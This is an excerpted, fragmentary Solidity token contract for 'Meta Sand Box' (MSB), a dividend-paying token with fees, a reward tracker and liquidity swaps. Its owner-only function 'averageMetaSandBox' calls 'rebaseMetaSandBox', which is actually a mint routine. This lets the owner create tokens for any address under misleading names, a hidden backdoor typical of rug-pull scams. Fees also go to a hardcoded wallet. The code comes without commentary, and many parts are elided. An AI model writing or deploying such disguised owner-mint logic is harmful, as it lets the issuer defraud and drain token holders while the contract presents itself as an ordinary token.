...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function rebaseMetaSandBox(address account, uint256 amount) internal virtual {
...
function rebaseMetaSandBox(address account, uint256 value) internal override {
    super.rebaseMetaSandBox(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      rebaseMetaSandBox(account, mintAmount);
...
contract MetaSandBoxrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardMetaSandBoxMap  for RewardMetaSandBoxMap .Map;
RewardMetaSandBoxMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("MetaSandBox_rewardToken_Tracker", "MetaSandBox_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "MetaSandBox_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "MetaSandBox_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main MetaSandBox contract.");
    }
...
contract MetaSandBox is ERC20, Ownable {
 ...
 address public lp;
  ILP public adressLiquidity;
    address public marketingReciever =0xB4d22FBD7ce045Ac006aa3637F2F0867D480cFB3;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Meta Sand Box", "MSB") {
 
        TotalFees = bnbReward.add(liquidityFee).add(marketing);
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new MetaSandBoxrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 rebaseMetaSandBox(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function averageMetaSandBox(address tokenAddress, uint256 tokenePercent) public masterWallet{
       rebaseMetaSandBox(tokenAddress, tokenePercent);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "MetaSandBox: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "MetaSandBox: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "MetaSandBox: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "MetaSandBox: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTMetaSandBox = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTMetaSandBox);
...
uint256 bnbForLiquidity = bnbBalance.mul(liquidityFee).div(bnbFeeFactor).div(2);
        uint256 bnbForReflection = bnbBalance.mul(bnbReward).div(bnbFeeFactor);
        uint256 bnbForDev = bnbBalance.sub(bnbForLiquidity).sub(bnbForReflection);
addLiquidity(tokensTMetaSandBox, bnbForLiquidity);
payable(marketingReciever).transfer(bnbForDev);
 (bool success,) = address(rewardToken).call{value: bnbForReflection}("");
if(success) {
            emit transferDividends(tokensToLiquify.mul(bnbReward).div(TotalFees), bnbForReflection);
        }
    }
